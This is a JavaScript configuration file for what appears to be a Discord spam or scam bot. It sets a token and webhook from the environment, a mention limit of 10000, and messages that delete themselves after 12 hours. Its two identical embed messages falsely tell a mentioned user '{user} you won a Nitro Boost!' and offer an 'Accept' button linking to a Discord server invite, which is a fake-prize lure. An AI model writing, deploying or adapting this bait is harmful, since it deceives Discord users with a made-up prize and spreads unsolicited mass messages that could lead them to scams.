module.exports = {
    token: process.env.token,
    advanced: {
        limit: 5,
        leave: true
    },
    auto_delete: {
        enabled: true,
        interval_seconds: 43200
    },
    blacklist: [],
    mention_limit: 10000,
    webhook:process.env.webhook,
    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",

    embed: {
        content: "{user} **you won a Nitro Boost** ! https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&",
        components: [
            {
                type: 1,
                components: [
                    {
                        type: 2,
                        label: "Accept",
                        style: 5,
                        emoji: {
                            name: "Discord",
                            id: "1243869797633232927",
                            animated: true
                        },
                        url: "https://discord.gg/MwRBgGGaam"
                    }
                ]
            }
        ]
    },

    // İkinci Mesaj (Aynı içerik, farklı bir olay için kullanılabilir)
    embed2: {
        content: "{user} **you won a Nitro Boost** ! https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&",
        components: [
            {
                type: 1,
                components: [
                    {
                        type: 2,
                        label: "Accept",
                        style: 5,
                        emoji: {
                            name: "Discord",
                            id: "1243869797633232927",
                            animated: true
                        },
                        url: "https://discord.gg/MwRBgGGaam"
                    }
                ]
            }
        ]
    }
};
